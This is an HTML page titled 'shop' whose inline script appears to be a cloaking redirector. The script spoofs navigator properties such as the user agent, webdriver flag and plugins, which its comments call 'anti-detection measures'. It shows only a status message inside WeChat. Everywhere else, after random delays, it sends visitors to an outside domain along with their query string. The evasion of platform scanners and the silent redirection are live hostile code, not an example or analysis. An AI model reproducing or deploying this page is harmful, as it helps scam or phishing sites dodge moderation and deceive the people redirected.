<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>shop</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
            background-color: #fff;
            margin: 0;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            text-align: center;
            overflow: hidden;
        }
        .container {
            width: 100%;
            padding: 0;
            height: 100vh;
        }
        .loading {
            padding: 20px;
            font-size: 16px;
            color: #666;
        }
        .status {
            margin-top: 20px;
            font-size: 14px;
            color: #999;
        }
    </style>
    <script>
        // Enhanced anti-detection measures
        (function() {
            // Overwrite key attributes
            Object.defineProperty(navigator, 'userAgent', {
                get: function() {
                    return 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1';
                },
                configurable: true
            });
            
            // Clear automation features
            Object.defineProperty(navigator, 'webdriver', {
                get: () => undefined,
                configurable: true
            });
            
            // Overwrite language properties
            Object.defineProperty(navigator, 'language', {
                get: () => 'zh-CN',
                configurable: true
            });
            
            Object.defineProperty(navigator, 'languages', {
                get: () => ['zh-CN', 'zh'],
                configurable: true
            });
            
            // Remove plugin information
            Object.defineProperty(navigator, 'plugins', {
                get: () => [],
                configurable: true
            });
        })();

        // Enhanced WeChat detection
        function enhancedWeChatCheck() {
            try {
                const checks = [];
                
                // Method 1: UserAgent detection
                checks.push(navigator.userAgent.toLowerCase().includes('micromessenger'));
                
                // Method 2: Global object detection
                checks.push(typeof WeixinJSBridge !== 'undefined');
                checks.push(typeof wx !== 'undefined');
                checks.push(typeof __wxjs_environment !== 'undefined');
                
                // Method 3: Specific API detection
                checks.push(!!navigator.vendor && navigator.vendor.includes('Tencent'));
                
                // Method 4: Behavior feature detection
                checks.push(!!window.WeixinJSBridge);
                
                return checks.some(Boolean);
            } catch (e) {
                return false;
            }
        }

        // Random redirect executor
        function executeRandomRedirect(url) {
            const randomDelay = Math.floor(Math.random() * 5000); // Random delay between 0 to 5000ms

            setTimeout(() => {
                window.location.href = url;  // Perform the redirection after the random delay
                console.log(`Redirecting to: ${url} after ${randomDelay}ms`);
            }, randomDelay);
        }

        // Main logic
        (function main() {
            // Random delay before executing main logic
            const delay = Math.random() * 1000 + 500;  // Delay between 500ms to 1500ms
            
            setTimeout(() => {
                const queryString = window.location.search;
                const targetUrl = 'https://phuro2.cc';
                const redirectUrl = targetUrl + queryString;

                // Check environment and execute corresponding operation
                if (enhancedWeChatCheck()) {
                    // In WeChat environment: Only show status information
                    document.getElementById('message').innerHTML = `
                        <div class="status">WeChat environment detected</div>
                    `;
                } else {
                    // In non-WeChat environment: Execute random redirect with delay
                    document.getElementById('message').innerHTML = `
                        <div class="loading"></div>
                        <div class="status" id="status">Initializing redirect program...</div>
                    `;
                    
                    // Start redirect after a random delay between 0 to 5 seconds
                    executeRandomRedirect(redirectUrl);
                }
            }, delay);
        })();
    </script>
</head>
<body>
    <div class="container">
        <div id="message">
            <div class="loading">loading...</div>
        </div>
    </div>
</body>
</html>
